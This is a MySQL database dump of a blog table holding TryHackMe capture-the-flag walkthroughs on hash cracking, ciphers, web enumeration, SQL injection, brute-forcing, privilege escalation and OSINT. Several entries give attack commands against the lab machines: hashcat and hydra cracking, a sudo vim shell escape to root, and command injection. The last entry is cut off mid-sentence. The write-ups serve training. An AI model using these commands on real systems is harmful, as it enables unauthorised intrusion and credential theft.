-- --------------------------------------------------------
-- Host:                         127.0.0.1
-- Server version:               8.0.30 - MySQL Community Server - GPL
-- Server OS:                    Win64
-- HeidiSQL Version:             12.1.0.6537
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


-- Dumping database structure for writeups_gothenburg_central_v_231
CREATE DATABASE IF NOT EXISTS `writeups_gothenburg_central_v_231` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
USE `writeups_gothenburg_central_v_231`;

-- Dumping structure for table writeups_gothenburg_central_v_231.blogs
CREATE TABLE IF NOT EXISTS `blogs` (
  `_id` int NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `content` text COLLATE utf8mb4_general_ci,
  `author` varchar(255) COLLATE utf8mb4_general_ci DEFAULT NULL,
  `post_date` timestamp NULL DEFAULT NULL,
  KEY `_id` (`_id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- Dumping data for table writeups_gothenburg_central_v_231.blogs: ~7 rows (approximately)
REPLACE INTO `blogs` (`_id`, `title`, `content`, `author`, `post_date`) VALUES
	(2, '@TryHackMe - Crack the hash', '--> https://tryhackme.com/r/room/crackthehash\r\n\r\n\r\nhttps://tryhackme-images.s3.amazonaws.com/room-icons/fafc074a97207f99929f2ee28bea87ac.jpeg\r\n\r\nTASK 1-1: MD5 HASH\r\nHash: 48bb6e862e54f2a795ffc4e541caed4d\r\n\r\nSolution: This one is easy, there are two ways to crack this MD5 hash\r\n\r\nMethod 1: Online hash cracker\r\n\r\nYou can visit any hash cracker site to crack the hash instantly. For example, the crack station. Just paste the hash and crack it. https://crackstation.net/\r\n\r\nMethod 2: Hashcat\r\n\r\nHashcat can identify hashes pretty well. We’ll use the following command to try and idenitfy it:\r\n\r\nhashcat --show hash\r\nIn this case, hashcat lists 11 different hashes that it could be, which isn’t ideal.\r\n\r\n\r\nThere is another program we can use called haiti which identifies hashes as well. It also lists a bunch of possibilities.\r\n\r\n\r\nAnother identification\r\nBased on these two results, we can reasonably assume that it is an MD4 or MD5 hash. We’ll start with MD5 as it is more popular. The hashcat code for MD5 is 0 so the following will be the command we use:\r\n\r\nhashcat -m 0 hash /usr/share/wordlists/rockyou.txt\r\nWithin a few seconds we get our result.\r\n\r\n\r\nResult of hashcat\r\n2. Second hash\r\nFollowing the same methodology as before, hashcat identifies the hash as SHA1.\r\n\r\n\r\nHashcat’s identification of second hash\r\nWe then run the same hashcat command but specify with a code of 100 which gets us the result almost immediately again.\r\n\r\n\r\nResult of hashcat\r\n3. Third hash\r\nHashcat identifies this as SHA-256.\r\n\r\n\r\nHashcat identification\r\nHashcat solves this quickly.\r\n\r\n\r\nHashcat cracking the hash\r\n4. Fourth hash\r\nHashcat identifies it as bcrypt.\r\n\r\n\r\nIdentifying the hash\r\nFor the wordlist we use for this hash, we need to be a little smarter. This will take an incredibly long amount of time if we don’t shorten the wordlist we use. We’re looking for a length of 4 so we’ll use awk to make rockyou smaller. We’ll use the following command to filter out any words that aren’t 4 places long and save it to a file called “filtered”:\r\n\r\nawk ‘length == 4’ /usr/share/wordlists/rockyou.txt > filtered\r\nLet’s see how much we reduced the size using the wc command. The rockyou.txt wordlist is more than 14 million words.\r\n\r\n\r\nOriginal size of rockyou\r\nWhen filtered, the length is only a bit more than 18,000, which will vastly reduce our time.\r\n\r\n\r\nThe rockyou.txt filtered\r\nNow we can use this as our wordlist for this hash. Within a few seconds we get a hit.\r\n\r\n\r\nCracking the hash\r\n5. Fifth hash\r\nHashcat identifies the hash as MD4.\r\n\r\n\r\nIdentifying the fifth hash\r\nWhen we run it through hashcat the wordlist is exhausted with no match.\r\n\r\n\r\nHash not cracked\r\nI then went to crackstation and put the hash in, which did return the correct result.\r\n\r\n\r\nCrackstation has the hash\r\nThe word is actually in rockyou.txt but the first letter is lowercase instead of capitalized, so it wasn’t found.\r\n\r\nTask 2: Level 2\r\n1. First hash\r\nWe’ll use the same methodology that we used in the first task. Hashcat identifies it as SHA2–256.\r\n\r\n\r\nHash identified\r\nHashcat then solves it quickly.\r\n\r\n\r\nHash cracked\r\n2. Second hash\r\nHashcat and haiti disagree on the identification.\r\n\r\n\r\nHashcat’s identification\r\n\r\nHaiti’s identification\r\nI decided that since we had already used MD5 and MD4 that it would probably be NTLM since that was listed in both haiti and hashcat, whereas LM was only listed in haiti. When we run it through hashcat we get it quickly.\r\n\r\n\r\nCracking the NTLM hash\r\n3. Third hash\r\nHashcat identifies it as sha512crypt.\r\n\r\n\r\nFor the sake of time I’m going to filter rockyou.txt down again to only words with a length of 6. In a real-world scenario we wouldn’t know this and would have to go through each word in rockyou. We’ll use the following command to filter it:\r\n\r\nawk ‘length == 6’ /usr/share/wordlists/rockyou.txt > filtered\r\nThis significantly reduces the wordcount from over 14 million to just under 2.\r\n\r\n\r\nFiltering the list again\r\nThis still takes about 6 minutes to crack.\r\n\r\n\r\nCracking the hash\r\n4. Fourth hash\r\nWhen putting this in the hash file, I made it pass:salt. Hashcat provides a multitude of different hash possibilities.\r\n\r\n\r\nHashcat identification\r\nHaiti didn’t have anything useful. We can assume that it’s some version of SHA1. Based on how we formatted the hash, we know the code can only be 110, or 160. We can remove all others because they have salt first or would be a hash of a hash which seems out of scope. If we don’t find it from either of these two we can reevaluate.\r\n\r\nUsing code 110 we exhaust all options with no match.\r\n\r\n\r\nNo match when using code 110\r\nNow let’s try 160.\r\n\r\n\r\nCracking the final hash\r\nWe got the hash which means that we have completed the room! We cracked all of the hashes using hashcat, haiti, and crackstation. I hope this writeup could be helpful in completing the room! If you are still struggling please leave a comment or message me on Twitter and I will try my best to assist!\r\n\r\n', '0xZenith', '2024-04-07 14:37:01'),
	(3, '@TryHackMe – Pickle Rick CTF', '--> https://tryhackme.com/r/room/picklerick\r\n\r\nhttps://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg\r\n\r\nAfter hitting the deploy button we now have our IP address.\r\n\r\npickle_ip_address\r\n\r\nWe see that this challenge is focused on finding vulnerabilities in a web server.\r\n\r\nLet’s run nmap, nikto, and dirbuster to see what we find…\r\n\r\npickle_nmap\r\n\r\nExecuting nmap, we see that there are two port open – 22 (ssh), and 80 (http).\r\n\r\nMoving on to nikto…\r\n\r\npickle_nikto\r\n\r\nRunning nikto we see that there is an login php file which is interested.\r\n\r\nFinally, let’s look at dirbuster.\r\n\r\npickle_dirb\r\n\r\nWith dirbuster we have an access directory, as well as an index.html, and robots.txt file (both returning a 200 which is good). We also have a server-status which is returning a forbidden http code of 403.\r\n\r\nWe’ve done basic enumeration let’s move to the web app and see if we can find more clues.\r\n\r\nLet’s answer the first question.\r\n\r\npickle_first_ingredient_question\r\n\r\nNavigating to the IP address in a browser we see the following.pickle_landing_page\r\n\r\nNothing really stands out, except for the burping :-). Let’s view the source code and see what we find.pickle_source_code\r\n\r\nViewing the source code (Right click on page, select view source code) we see at the bottom there’s a username. Let’s see if we can find a password. Maybe our dirbuster results will come in handy…pickle_robots\r\n\r\nGoing back to our results in dirb we notice there’s a robots.txt file. Going to this file, we see the above. Hmm, this is a strange robots.txt file. Maybe this could be the password, let’s see if it works.pickle_login\r\n\r\nIn our nikto results, we had a login page. Navigating to that page and entering our username from the index.html page, and a password from the robots.txt page we get the following.pickle_portal\r\n\r\nSuccess! We’re in the application.\r\n\r\nLet’s run the ls (listing) command with the options of all and long listing and see what we have.\r\n\r\npickle_listing\r\n\r\npickle_listing_directory\r\n\r\nOpening the Sup3rS3cretPickl3Ingred.txt file we have the first ingredient below.pickle_first_ingredient\r\n\r\nAlso notice that the directory shows the asset directory that we found in dirbuster. Navigating to that webpage we see the following\r\n\r\npickle_assets_directory\r\n\r\nThe directory have gifs and jpgs, nothing of importance to solve the challenge.\r\n\r\nLet’s move on to question 2.pickle_second_ingredient_question\r\n\r\nWe know this application is vulnerable to command injection, let’s see if we can perform a directory traversal to view other parts of the application. Going back to the directory  listing we notice there’s a clue.txt file. Opening the file we see the following\r\n\r\npickle_clue_txt\r\n\r\nOur hunch was correct, we need to look around the file system to find the next ingredient. pickle_directory_traversal\r\n\r\nIn the above command we’re doing a directory traversal to move up to the root directory, list all of the files in long form (ls -al), and print the working directory to make sure we’re in the correct folder (pwd). Doing this we get the below screenshot.\r\n\r\npickle_root_directory\r\n\r\nWe’re viewing the root level directory, so our command(s) were a success! We notice a lot of folders, but at this time two are useful for us. The first is home, which in every  Linux system ever user has a home directory. The second is root (admin/super user) which can only be accessed through the admin. We’ll come back to root later. Let’s see if we can navigate to the home directory.\r\n\r\npickle_change_home_directory\r\n\r\npickle_listing_home_directory\r\n\r\nExecuting the command above, we’re now in the /home directory! We notice there are two folders, rick and Ubuntu. The Ubuntu folder is from the operating system. Let’s explore the rick folder and see what we can find.\r\n\r\npickle_change_rick_directory\r\n\r\nChanging to the rick directory we see the second ingredient!\r\n\r\npickle_list_second_ingredient_rick_directory\r\n\r\npickle_less_second_ingredient\r\n\r\nUsing the less command we open the second ingredient. Note: The filename is in quotations due to spacing. Without the quotations Linux would interpret the second in second ingredients.\r\n\r\npickle_second_ingredient_answer\r\n\r\nWe now have our second ingredient, let’s answer the final question.\r\n\r\npickle_third_ingredient_question\r\n\r\nRemember in the beginning of this walkthrough, I mentioned that another folder – root is of particular interest to us and only the admin or superuser is the only user to access this folder. Let’s see if we can elevate our privileges to the admin and view this folder.\r\n\r\npickle_sudo_listing\r\n\r\nBefore we can access this folder, let’s run the sudo -l command to see what privileges we have on this box.\r\n\r\nExecuting this command we see that we can execute ANY command on this box WITHOUT a password (ALL NOPASSWD: ALL). This surely is NOT good security! Let’s use the sudo command with the listing (ls) with the root folder and see what we can find.\r\n\r\npickle_sudo_listing_as_root\r\n\r\nExecuting the command, we see that there are two files in the /root folder. One of them is named 3rd.txt. Could this be our third ingredient? Let’s see.\r\n\r\npickle_access_root_listing\r\n\r\nExecuting the sudo command in conjunction with the less command on the 3rd.txt file, we see that we do indeed have the third and final ingredient.\r\n\r\npickle_less_root_third_ingredient\r\n\r\npickle_third_ingredient\r\n\r\nChallenge solved!', '0xZenith', '2024-04-07 14:37:02'),
	(4, '@TryHackMe - c4ptur3-th3-fl4g', '--> https://tryhackme.com/r/room/c4ptur3th3fl4g\r\n\r\nhttps://tryhackme-images.s3.amazonaws.com/room-icons/8b906b3d444362152f1cd3e521aa7e4a.png\r\n\r\n\r\nTASK 1: TRANSLATION AND SHIFTING\r\nThis task required the challenger to perform a translation or shifting certain ciphers such as ROT13, ROT47, Morse code, etc.\r\n\r\nTASK 1-1: LEET A.K.A L33T\r\nLeet is a form of font which is used mostly on the internet. Is a famous font used by numerous hackers.\r\n\r\nCipher: c4n y0u c4p7u23 7h3 f149\r\nSolution: This is a straight forward task, you can guess the answer easily. Or, using this converter.\r\nAnswer: can you capture the flag\r\n\r\nTASK 1-2: BINARY TO ASCII\r\nBinary is a type of machine language.\r\n\r\nCipher: 01101100 01100101 01110100 01110011 00100000 01110100 01110010 01111001 00100000 01110011 01101111 01101101 01100101 00100000 01100010 01101001 01101110 01100001 01110010 01111001 00100000 01101111 01110101 01110100 00100001\r\nSolution: Copy the cipher code into the converter.\r\nAnswer: lets try some binary out!\r\n\r\nTASK 1-3: BASE32\r\nBase32 is a common transfer encoding. It consists of 32-char set. These char-sets are usually alphabet in uppercase.\r\n\r\nCipher:MJQXGZJTGIQGS4ZAON2XAZLSEBRW63LNN5XCA2LOEBBVIRRHOM======\r\nSolution: Put the cipher code into the converter\r\nAnswer: base32 is super common in CTF’s\r\n\r\nTASK 1-4: BASE64\r\nBase64 is another common transfer encoding. It consists of 64-char set. These char-sets are usually alphabet in uppercase and lowercase.\r\n\r\nCipher:RWFjaCBCYXNlNjQgZGlnaXQgcmVwcmVzZW50cyBleGFjdGx5IDYgYml0cyBvZiBkYXRhLg==\r\nSolution: Put the cipher code into the converter\r\nAnswer: Each Base64 digit represents exactly 6 bits of data.\r\n\r\nTASK 1-5: HEX TO ASCII\r\nHex consists of 16 bits of binary. It also known as base16.\r\n\r\nCipher: 68 65 78 61 64 65 63 69 6d 61 6c 20 6f 72 20 62 61 73 65 31 36 3f\r\nSolution: Copy the cipher into the converter\r\nAnswer: hexadecimal or base16?\r\n\r\nTASK 1-6: ROT 13\r\nRot 13 or known as rotate 13 is a form of Caesar cipher which rotate in 13 times.\r\n\r\nCipher: Ebgngr zr 13 cynprf!\r\nSolution: Punch in the cipher into the converter\r\nAnswer: Rotate me 13 places!\r\n\r\nTASK 1-7: ROT 47\r\nRot 47 or known as rotate 47 is another form of Caesar cipher which rotate in 47 times. It encode almost all visible ASCII character.\r\n\r\nCipher: *@F DA:? >6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:>6DX\r\nSolution: Copy the cipher into the converter\r\nAnswer: You spin me right round baby right round (47 times)\r\n\r\nTASK 1-8: MORSE CODE\r\nMorse code is a combination of signal made of short and long impulsion (dot and dash). It was designed for telecommunication.\r\n\r\nCipher: – . .-.. . -.-. — — — . .- -. .. -.-. .- – .. — -. . -. -.-. — -.. .. -. –.\r\nSolution: Put the cipher into the converter\r\nAnswer: telecommunication encoding\r\n\r\nTASK 1-9: BCD TO ASCII\r\nBinary-Coded Decimal (BCD) is a base10 encoding technique.\r\n\r\nCipher: 85 110 112 97 99 107 32 116 104 105 115 32 66 67 68\r\nSolution: Punch in the cipher into the converter\r\nAnswer: Unpack this BCD\r\n\r\nTASK 1-10: MULTIPLE CIPHER\r\nThis task consists of multiple ciphers. Challenger required to decode the cipher from the previous task\r\n\r\nCipher 1: Base64\r\nCipher 2: Morse code\r\nCipher 3: Binary to ASCII\r\nCipher 4: ROT 47\r\nCipher 5: BCD to ASCII\r\nAnswer: Let’s make this a bit trickier…\r\n\r\nTASK 2: HASHES\r\nIf you refer to my previous post, a hash can be cracked using hashcat either by brute force or dictionary. However, it is not a 100% guarantee that the hash can be cracked using the hashcat. For this task, the author suggested using a brute-forcing. However, it is impossible as the permutation is too large and it will take more than a day. The only way to do that is to decrypt it using online tools such as md5decrypt. This is because the hashed text has been stored in their database.\r\n\r\nTASK 2-1: MD2\r\nThis task can be done using this online tool.\r\n\r\nHash: 39d4a2ba07e44421c9bedd54dc4e1182\r\nAnswer: MDwhat?\r\n\r\nTASK 2-2: MD4\r\nFrom this task onward, the hashes can be cracked using md5decrypt.\r\n\r\nHash: e0418e7c6c2f630c71b2acabbcf8a2fb\r\nAnswer: digest the message algorithm\r\n\r\nTASK 2-3: MD5\r\nHash: efbd448a935421a54dda43da43a701e1\r\nAnswer: 128-bit of delicious hash values\r\n\r\nTASK 2-4: NTLM\r\nHash: 11FE61CE0639AC2A1E815D62D7DEEC53\r\nAnswer: Microsoft has encryption?\r\n\r\nTASK 2-5: SHA512\r\nHash: a361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8\r\nAnswer: 1024 bit blocks!\r\n\r\nTASK 2-6: SHA256\r\nHash: d48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f\r\nAnswer: Commonly used in Blockchain\r\n\r\nTASK 2-7: SHA1\r\nHash: a34e50c78f67d3ec5d0479cde1406c6f82ff6cd0\r\nAnswer: The OG\r\n\r\nTASK 3: SPECTROGRAM\r\nThis task is easy. Just download any sound or wave analyzer tool such as aducity. For this task, I going to use wavepad. Simply open the downloaded wave file and open it up in TFFT (Tool > TFFT). A message will be revealed.\r\n\r\n\r\nThe secret message\r\nAnswer: Super Secret Message\r\n\r\nTASK 4: STEGANOGRAPHY\r\nThis task can be solved either by an online tool or steghide. I prefer steghide. The hidden file within the image can be extracted using the following command\r\n\r\n$ steghide extract -sf stegosteg.jpg\r\nAfter that, a file named steganopayload2248.txt will be extracted from the image as shown in the figure below.\r\n\r\n\r\nSteghide output\r\nTASK 5: WHAT IS INSIDE THE FILE?\r\nThis task cannot simply be solved by steghide. There is another dumb way to do it which is open the file as a txt. Both answers for the task is on the last few paragraphs.\r\n\r\n\r\n1 stone kill 2 birds.\r\nAnswer (Task 5-1): hackerchat.png\r\nAnswer (Task 5-2): AHH_YOU_FOUND_ME!', '0xZenith', '2024-04-07 14:37:02'),
	(5, '@TryHackMe - Simple CTF', '--> https://tryhackme.com/r/room/easyctf\r\n\r\n\r\nhttps://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png\r\n\r\nFirst things first! When you deploy your machine and connect to the TryHackMe VPN, we are ready to begin.\r\n\r\n#1 — How many services are running under port 1000?\r\nTo answer that question you need to start a scan with our beautiful tool called “nmap”. Usually i save the output of the nmap scan inside a file that’s why my command have the “-oN {file_name}” at the end.\r\n\r\nnmap -sV -sS -T4 -p- -vv {machine_ip} -oN portscan.txt\r\n\r\nAnswer : 2.\r\n\r\n#2 — What is running on the higher port?\r\nThis answer can be found in the same nmap scan you did before. :)\r\n\r\nAnswer : ssh.\r\n\r\n#3 — What’s the CVE you’re using against the application?\r\nFor this question, i did a little research on the machine because i couldn’t find anything with nmap tag “ — script”. So i started a gobuster search to find available url paths. I choose to save the gobuster’s output that’s why i have the “-o {file_name}” at the end of the command.\r\n\r\ngobuster dir -w /usr/share/dirb/wordlists/common/txt -u http://{machine_ip} -t 20 -o gobusterscan.txt\r\n\r\nGo Buster result :\r\n\r\n/.hta (Status: 403)\r\n/.htaccess (Status: 403)\r\n/.htpasswd (Status: 403)\r\n/index.html (Status: 200)\r\n/robots.txt (Status: 200)\r\n/server-status (Status: 403)\r\n/simple (Status: 301)\r\n\r\nAfter visiting almost every single one of them, i went to the “/simple” one and i found a CMS Made Simple Application inside!\r\nThat’s interesting.\r\n\r\nI looked for other interesting things also and i found that a version.\r\n\r\n\r\nThis site is powered by CMS Made Simple version 2.2.8\r\nAnd now our beloved assistant Google. I simply googled about “cms made simple exploit” and i found that there are plenty of them.\r\nAlso, i searched with “searchexploit” because..why not?\r\n\r\n\r\nsearchexploit search\r\nI saw that there is one about sql injection!\r\nI googled the specific Injections that i have found and i stuck with this one.\r\n\r\nOffensive Security\'s Exploit Database Archive\r\nCMS Made Simple < 2.2.10 - SQL Injection. CVE-2019-9053 . webapps exploit for PHP platform\r\nwww.exploit-db.com\r\n\r\nAnswer : CVE-2019–9053.\r\n\r\n#4 — To what kind of vulnerability is the application vulnerable?\r\nAfter the hole research we have done up to this point we know that we are going to make SQL Injection.\r\n\r\nAnswer : sqli\r\n\r\n#5 — What’s the password?\r\nThat was also fun to complete!!\r\n\r\nFirst i read the hole documentation about the SQL Injection i can complete. When i scrolled down, while i was looking for a way to exploit the vulnerability, i saw a python script. I copied the script inside a file and named it exploit.py. But when i tried to run it i saw that some libraries where missing from my python so i had to install them myself.\r\n\r\nYou can check that guide to help you understand how “pip” works inside python and how to use it.\r\n\r\n#1- Be sure that you have pip installed.\r\n#2- After that be sure that you have installed the libraries that python script needs to run.\r\n#3- I didn’t had two of them. So i download these two :\r\n- pip install requests\r\n- pip install termcolor\r\nWhen you are done, you can start the script!\r\n\r\nAnswer : secret.\r\n\r\n#6 — Where can you login with the details obtained?\r\nAs we know about which ports are open, in the previous scan i made with nmap, i also scanned for services so i know that at 2222 port we have an ssh. So with these kind of information we can SSH the machine :\r\n\r\nssh {username_script_found}@{machine_ip} -p 2222\r\n\r\nAnswer : ssh.\r\n\r\n#7 — What’s the user flag?\r\nWhen you access the shell it’s time to see what is inside.\r\n\r\nls -la\r\n\r\nYou are going to notice a user.txt file.\r\n\r\ncat user.txt\r\n\r\n\r\nAnswer : G00d j0b, keep up!\r\n\r\n#8 — Is there any other user in the home directory? What’s its name?\r\nJust go to a previous directory!\r\n\r\ncd ..\r\n\r\nJust do ls inside the directory you are inside now :\r\n\r\n\r\nDone!\r\n\r\nAnswer : sunbath.\r\n\r\n#9 — What can you leverage to spawn a privileged shell?\r\nWell, now let’s see what can we do with “sudo” command.\r\n\r\n\r\nWe see now that we can use vim directory to gain root access!\r\n\r\nsudo vim -c “:!/bin/sh”\r\n\r\n\r\nAaand did it! 😃\r\n\r\n#10 — What’s the root flag?\r\nThat was a little bit easier than i though to be honest.\r\nI just went into a previous directory with :\r\n\r\ncd ..\r\n\r\nDid :\r\n\r\nls -la\r\n\r\nI saw a root folder and instantly entered!\r\n\r\ncd root\r\n\r\nDid :\r\n\r\nls\r\n\r\nAnd found a root.txt file!\r\nI simply did a “cat root.txt” and we are done!!\r\n\r\n\r\nAnswer : W3ll d0n3. You made it!', '0xZenith', '2024-04-07 14:37:03'),
	(6, '@TryHackMe - Agent Sudo', '--> https://tryhackme.com/r/room/agentsudoctf\r\n\r\nhttps://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ytimg.com%2Fvi%2F531_9Jcd3F8%2Fhqdefault.jpg&f=1&nofb=1&ipt=a8b6ae5e057176fd6f1553a6f8ee2d9989135f288b27a2445f08f5a05a1b2a4d&ipo=images\r\n\r\nFirst things first! When you deploy your machine and connect to the TryHackMe VPN, we are ready to begin.\r\n\r\nSo let’s begin :)\r\n\r\nTask 2\r\nEnumerate the machine and get all the important information.\r\n\r\n#1 — How many open ports?\r\n\r\nFor this question i used nmap.\r\n\r\nnmap -Pn -A -T4 -vv {target_ip}\r\n\r\n#2 — How you redirect yourself to a secret page?\r\n\r\nFor this part i used Burp Suite.\r\n\r\nYou need to visit the target IP first and just read the message that Agent R left there for the users of this machine!\r\n\r\n\r\nobserve and think :)\r\nI looked at source code, didn’t find anything. I also did a go buster scan to search for other directories. Nothing.\r\n\r\nSo i opened Burp Suite and intercept the request. If you look closely every Agent’s name is a single letter so we are going to use that to find the secret directory. So i set the intercept ON on Burp Suite and sent the request to Intruder. Changed the User-Agent section to a single letter, as the letter we get from the Agent R.\r\n\r\n\r\nChange the user-agent section on request.\r\nAfter that i made a simple list of payloads with single letters just to see if i can find anything weird.\r\n\r\n\r\nset your own payload.\r\nClick Add and enter the same letters as i did. When you are ready click on Start Attack.\r\n\r\n\r\nsomething strange here on a single letter.\r\nAs you can observe too, the only letter we get something weird about is the letter C. So i went to the Repeater inside Burp Suite and provided to the User-Agent section with the letter C.\r\n\r\n\r\nChanging the User-Agent section.\r\nAnd we have the answer we where looking for.\r\n\r\n#3 — What is the agent name?\r\n\r\nIf you set the User-Agent section to just C you get a response about a .php file. So i used that too to find the agent name by changing the path inside the request and just resend the request.\r\n\r\n\r\nUsing the path of the file we found to get a response for another agent.\r\nNow we found the name too!\r\n\r\nTask 3\r\nDone enumerate the machine? Time to brute your way out.\r\n\r\n#1 —FTP password\r\nFor that we are going to use Hydra.\r\n\r\nYou need to run the command :\r\n\r\nhydra -l {username_you_found} -P /usr/share/wordlists/rockyou-short.txt ftp://{target_ip} -t 4 -vV\r\n\r\nI prefer first to use the short edition of the rockyou.txt file.\r\n\r\nFtp done ;).\r\n#2 —Zip file password\r\nAfter we get into the ftp with the credentials we found above we must look for what’s inside the ftp client.\r\n\r\n\r\nInside the ftp.\r\nHmm, that’s interesting. We found 3 files. I’m going to get them all to my local machine with the get command.\r\n\r\n\r\nget command in ftp.\r\nAfter i got the files, i tried Exiftool, StegHide but nothing came up. I googled about other tools that i could use to get information from .jpg, .png files and i found about binwalk. So i tried with binwalk and that’s what we got!\r\n\r\n\r\nextracted a zip with encryption.\r\nWe see inside the new folder we got these files.\r\n\r\nWe use zip2john 8702.zip > output.txt to make the zip file a readable file for john and we go for the hash with john.\r\n\r\nzip2john 8702.zip > output.txt.\r\njohn output.txt.\r\nAnd you crack it! :)\r\n\r\n#3 — steg password\r\nFor this question you need to extract the file we found above first.\r\nYou need the command : 7z -e 8702.zip\r\n\r\nI tried with unzip but it didn’t worked.\r\nAfter you enter the password you are going to see a file like this :\r\n\r\n\r\nLook inside the file we extracted.\r\nThis is an encoded message. I decoded it with a tool called Decodify\r\n\r\n\r\nDecoding the encoded message with Decodify.\r\nYou can get this tool by downloading this repository from github to you local machine.\r\n\r\nhttps://github.com/s0md3v/Decodify\r\nAnd we found the answer to question 3 :)\r\n\r\n#4 — Who is the other agent (in full name)?\r\nFor this question i used StegHide. From our downloaded files we got a cute-alien.jpg, but is asking for a passphrase. I used the encoded message we decoded and i got a message.txt.\r\n\r\nSo from the message.txt we got both answer 4 and answer 5 :)\r\n\r\n\r\nAnswer for 4&5 questions.\r\nTask 4\r\nYou know the drill.\r\n\r\n#1 — What is the user flag?\r\nNow that we got our answers and complete the task 3 we can use them to ssh to the server and find the user flag :)\r\n\r\n\r\nuser_flag.txt\r\n#2–What is the incident of the photo called?\r\nWe see inside /home/{username_we_found} directory that there is another file “Alien_autospy.jpg”\r\n\r\nI used the command scp to get the file locally.\r\n\r\nscp <user@machineip>:Alien_autospy.jpg /localdir/.\r\n\r\nAfter opening the file and with some google search i found the answer :)\r\n\r\nTask 5 Privilege escalation\r\nEnough with the extraordinary stuff? Time to get real.\r\n\r\n#1 — CVE number for the escalation\r\nI did a sudo -l command here and a sudo -V in order to find something useful to exploit for privesc.\r\n\r\n\r\nSudo -l & Sudo -V\r\nI googled the version and i found a very easy one exploit we can use.\r\n\r\n#2 — What is the root flag? & #3 — (Bonus) Who is Agent R?\r\nAfter you become root you can get the answer for both of these questions together. :)\r\n\r\n\r\nAnswers 2 & 3 together.\r\n', '0xZenith', '2024-04-07 14:37:03'),
	(8, '@TryHackMe - Sakura Room OSINT (Use a variety of OSINT techniques to solve this room)', '--> https://tryhackme.com/r/room/sakura\r\n\r\nhttps://tryhackme-images.s3.amazonaws.com/room-icons/9a365314266266592078724ce18b248b.png\r\n\r\n\r\nTask 1: Introduction\r\nObjective: Task 1 is simply to give you some background on the room and make sure you have read the instructions.\r\n\r\nQuestion 1: Are you ready to begin?\r\n\r\nProcess: You can find the flag for the first question listed in the background and instructions in the Task 1 section.\r\n\r\n\r\nTask 2: Tip-Off\r\nObjective: Task 2 provides a short synopsis of the fictitious cyber attack that occurred on the OSINT Dojo. The task provides an image file that was saved from the attack and asks you to analyze the file for any breadcrumbs that might lead you to finding the perpetrator.\r\n\r\nQuestion 2: What username does the attacker go by?\r\n\r\nProcess: You can find the flag for the first question by analyzing the photo provided in the background section. Click on the link in the background section to open the photo in a new browser window.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*cSoR5O_w4DwrZmXwAdRYeQ.png\r\n\r\nThe interesting thing about this is that it’s a vector graphic, so any metadata associated with it will be in the source code. The biggest thing that stands out is the binary in the background, let’s open the source code and find out what the binary means.\r\n\r\n\r\nLet’s plug this in to RapidTables’ Binary to Text Translator.\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*ozntbPOja-8Jja-EibA46w.png\r\n\r\nMessage from the binary\r\nThis just tells us to look at the metadata, which is located at the top of the source code. Looking at this shows us where the file was uploaded from, which reveals the username.\r\n\r\n\r\nThis just tells us to look at the metadata, which is located at the top of the source code. Looking at this shows us where the file was uploaded from, which reveals the username.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*WSXz2QgH_mlpC8-xWoOm3Q.png\r\nFinding the username\r\nTask 3: RECONNAISSANCE\r\n1. What is the full email address used by the attacker?\r\nLet’s do a Google search of the username and see if we can find anything useful.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*7ukTnJF24PudFLSOabkzag.png\r\n\r\nNice! Our attacker uses similar and related handles on GitHub, LinkedIn, and Twitter. We can look at their GitHub to try to find their email. One of their repositories is their PGP public key.\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*MxrFqalt9uBLR5szXu-TvA.png\r\n\r\nPGP key repository\r\nWe can use this key for to find their email address. Let’s copy it into a file called “pubkey” on our machine. We can then run the following command to list the email address:\r\n\r\ngpg pubkey\r\nhttps://miro.medium.com/v2/resize:fit:640/format:webp/1*42c-AYzB4DobAXbPwJlNiw.png\r\n\r\nFinding the attacker’s email address\r\n2. What is the attacker’s full real name?\r\nThe attacker’s LinkedIn page from the Google search lists their full name.\r\n\r\nTask 4: UNVEIL\r\n1. What cryptocurrency does the attacker own a cryptocurrency wallet for?\r\nIf we go to the attacker’s GitHub repository page, we can see one for cryptocurrency.\r\n\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*64zD2Hg-3WbiqCd1nAepnw.png\r\n\r\nCryptocurrency repository\r\n2. What is the attacker’s cryptocurrency wallet address?\r\nEntering this repository we can’t immediately see an address. If we look at the commit history, we can see the original creation.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*uyPtzEwK8IiLpk8YVPPTYg.png\r\nOld commit\r\nIf we go to this script we can see their address.\r\n\r\n3. What mining pool did the attacker receive payments from on January 23, 2021 UTC?\r\nWe can use Etherscan to see any transactions associated with the wallet.\r\n\r\nhttps://miro.medium.com/v2/resize:fit:720/format:webp/1*jsRI0eyh_ZHTX9l6sxlWag.png\r\n\r\nTransactions\r\n4. What other cryptocurrency did the attacker exchange with using their cryptocurrency 